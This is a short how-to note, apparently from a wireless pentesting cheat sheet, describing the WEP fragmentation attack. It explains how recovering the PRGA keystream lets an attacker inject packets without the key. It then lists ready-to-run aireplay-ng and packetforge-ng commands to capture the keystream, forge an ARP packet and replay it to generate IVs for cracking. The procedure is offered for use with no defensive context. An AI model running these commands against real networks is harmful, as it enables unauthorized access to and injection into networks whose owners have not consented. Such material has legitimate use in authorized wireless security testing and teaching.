Fragmentation Attack

This exploits WEP's packet fragmentation feature to extract the PRGA (Pseudo-Random Generation Algorithm) keystream from a single
captured data packet, which can then be used to craft and inject arbitrary packets even without knowing the WEP key.
This doesn't directly give you the WEP key - it gives you the ability to inject packets, which you then use to generate IVs for
actual key cracking. 

aireplay-ng -5 -b $ap_mac -h $local_mac $interface

Then you need to convert the keystream into a .cap file

packetforge-ng --arp -y [keystream.xor] -a $ap_mac -h $local_mac -k 255.255.255.255 -l 255.255.255.255 -w output.cap

THen replay the .cap file to generate traffic

aireplay-ng -3 -b $ap_mac -h $local_mac -r output.cap $interface
